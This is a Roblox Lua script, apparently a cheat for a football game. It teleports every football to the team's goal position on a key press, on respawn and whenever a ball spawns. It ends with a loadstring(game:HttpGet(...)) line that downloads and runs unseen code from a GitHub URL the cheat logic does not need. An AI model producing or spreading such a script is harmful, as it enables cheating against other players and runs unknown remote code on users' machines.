print "start load script"
--G gol
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local UserInputService = game:GetService("UserInputService")

local Player = Players.LocalPlayer

-- Function to safely find all footballs in the Junk folder
local function findBalls()
    local junkFolder = Workspace:FindFirstChild("Junk")
    local balls = {}
    if junkFolder then
        for _, obj in pairs(junkFolder:GetChildren()) do
            if obj:IsA("Part") and obj.Name == "Football" then
                table.insert(balls, obj)
            end
        end
    else
        print("Junk folder not found!")
    end
    return balls
end

-- Function to teleport all balls to a "very hard" position based on the player's team
local function teleportAllBalls()
    local targetPosition = nil

    -- Check player's team and set "very hard" target positions
    if Player.Team then
        if Player.Team.Name == "Home" then
            targetPosition = Vector3.new(2.010676682, 4.00001144, -186.170898)  -- Home team's "very hard" position
            print("Home")
        elseif Player.Team.Name == "Away" then
            targetPosition = Vector3.new(-0.214612424, 4.00001144, 186.203613)  -- Away team's "very hard" position
            print("Away")
        end
    end

    if targetPosition then
        local balls = findBalls()
        if #balls > 0 then
            for _, ball in pairs(balls) do
                -- Safe teleportation with error handling to avoid crashes
                local success, errorMessage = pcall(function()
                    ball.CFrame = CFrame.new(targetPosition) -- Teleport the ball to the "very hard" position
                end)
                if success then
                else
                    warn("Error teleporting ball: " .. errorMessage)
                end
            end
        else
            warn("No ball found ")
        end
    else
        warn("NONE")
    end
end

-- Function to handle reset and player respawn
local function onPlayerRespawned()
    -- Wait for the character to fully load
    local character = Player.Character or Player.CharacterAdded:Wait()
    print("Player respawned, waiting for character to load...")
    
    -- Wait for necessary parts to load before teleporting
    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

    -- Ensure we teleport balls after the character is fully loaded
    teleportAllBalls()

    -- Detect when new footballs are added (after player reset)
    local childAddedConnection
    childAddedConnection = Workspace.ChildAdded:Connect(function(child)
        if child:IsA("Part") and child.Name == "Football" then
        end
    end)

    -- Disconnect the event when no longer needed (avoids multiple event listeners)
    -- Ensures the function doesn't stack up event listeners over time
    wait(1)  -- Give some time to process the respawn and football addition.
    if childAddedConnection then
        childAddedConnection:Disconnect()
    end
end

-- Trigger the teleportation when the user presses 'G'
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode.G then
        teleportAllBalls()
    end
end)

-- Connect to the player's respawn event
Player.CharacterAdded:Connect(function(character)
    print("Player character  checking respawn...")
    -- After respawn, call onPlayerRespawned to make sure the balls are in position
    onPlayerRespawned()
end)

-- Detect ball reset and re-teleport balls if any are added
Workspace.ChildAdded:Connect(function(child)
    if child:IsA("Part") and child.Name == "Football" then
        print("ball added")
        -- If a new football is added (e.g., on respawn), teleport it to the target position
        teleportAllBalls()
    end
end)


loadstring(game:HttpGet("https://raw.githubusercontent.com/NOTHINGx555/load/refs/heads/main/.lua"))()
print "end load script"
